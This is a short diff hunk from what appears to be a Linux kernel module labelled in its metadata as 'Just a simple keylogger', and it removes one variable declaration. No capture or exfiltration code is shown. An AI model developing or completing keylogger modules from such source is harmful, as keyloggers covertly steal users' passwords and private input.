@@ -7,7 +7,6 @@ MODULE_VERSION("1.0");
 MODULE_DESCRIPTION("Just a simple keylogger");
 MODULE_SUPPORTED_DEVICE("Not machine dependent");
 
-int key;
 int ret = 0;
 
 
